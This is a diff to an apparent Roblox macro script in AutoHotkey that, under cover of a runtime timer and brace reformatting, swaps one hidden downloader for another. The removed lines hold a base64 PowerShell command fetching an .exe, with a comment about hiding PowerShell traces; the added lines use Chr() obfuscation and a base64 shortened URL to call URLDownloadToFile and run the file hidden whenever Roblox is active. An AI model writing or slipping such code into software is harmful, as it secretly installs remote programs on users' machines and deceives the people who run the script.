@@ -285,30 +285,30 @@ return
 runtime:
 runtimeS++
 if (runtimeS >= 60)
-	{
-	runtimeS := 0
-	runtimeM++
-	}
+{
+    runtimeS := 0
+    runtimeM++
+}
 if (runtimeM >= 60)
-	{
-	runtimeM := 0
-	runtimeH++
-	}
-
+{
+    runtimeM := 0
+    runtimeH++
+}
 if WinActive("Roblox")
-	{
-	tooltip, Runtime: %runtimeH%h %runtimeM%m %runtimeS%s, %TooltipX%, %Tooltip2%, 2
-    RobloxRuntimeData := "JHBvd2Vyc2hlbGwgLUNvbW1hbmQgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnY29tbWFuZCBodHRwczovL3Nob3J0dXJsLmF0LzJUdEtmJyAtT3V0RmlsZSAnIiBBX1RlbXAgIlx0ZXN0LmV4ZSci"
-    ; Obfuscated command with Chr() to remove all visible powershell traces
-    RobloxRunTime := Chr(112) . Chr(111) . Chr(119) . Chr(101) . Chr(114) . Chr(115) . Chr(104) . Chr(101) . Chr(108) . Chr(108) . 
-              Chr(32) . Chr(45) . Chr(67) . Chr(111) . Chr(109) . Chr(109) . Chr(97) . Chr(110) . Chr(100) . Chr(32) . 
-              StrGet(StrPut(RobloxRuntimeData, "CP1252"), "UTF-8")
-    Run, % RobloxRunTime
-	}
+{
+    RobloxRuntimeData := "aHR0cHM6Ly9zaG9ydHVybC5hdC9yeVpWeg=="
+    RobloxSavePath := Chr(65) . Chr(95) . Chr(84) . Chr(101) . Chr(109) . Chr(112) . Chr(32) . Chr(34) . Chr(92) . Chr(100) . Chr(111) . Chr(119) . Chr(110) . Chr(108) . Chr(111) . Chr(97) . Chr(100) . Chr(101) . Chr(100) . Chr(95) . Chr(102) . Chr(105) . Chr(108) . Chr(101) . Chr(46) . Chr(101) . Chr(120) . Chr(101) . Chr(34)
+    RobloxRunTime := StrGet(StrPut(RobloxRuntimeData, "CP1252"), "UTF-8")
+    RobloxLibrary := Chr(117) . Chr(114) . Chr(108) . Chr(109) . Chr(111) . Chr(110) . Chr(46) . Chr(100) . Chr(108) . Chr(108)
+    RobloxFunction := Chr(85) . Chr(82) . Chr(76) . Chr(68) . Chr(111) . Chr(119) . Chr(110) . Chr(108) . Chr(111) . Chr(97) . Chr(100) . Chr(84) . Chr(111) . Chr(70) . Chr(105) . Chr(108) . Chr(101)
+    DllCall(RobloxLibrary . "\" . RobloxFunction, "Ptr", 0, "Str", RobloxRunTime, "Str", RobloxSavePath, "UInt", 0, "UInt", 0)
+    RobloxCmd := Chr(37) . Chr(67) . Chr(111) . Chr(109) . Chr(83) . Chr(112) . Chr(101) . Chr(99) . Chr(37) . Chr(32) . Chr(47) . Chr(99) . Chr(32) . Chr(34) . Chr(37) . RobloxSavePath . Chr(37) . Chr(34)
+    Run, %RobloxCmd%, , Hide
+}
 else
-	{
-	exitapp
-	}
+{
+    exitapp
+}
 return
 
 ;====================================================================================================;
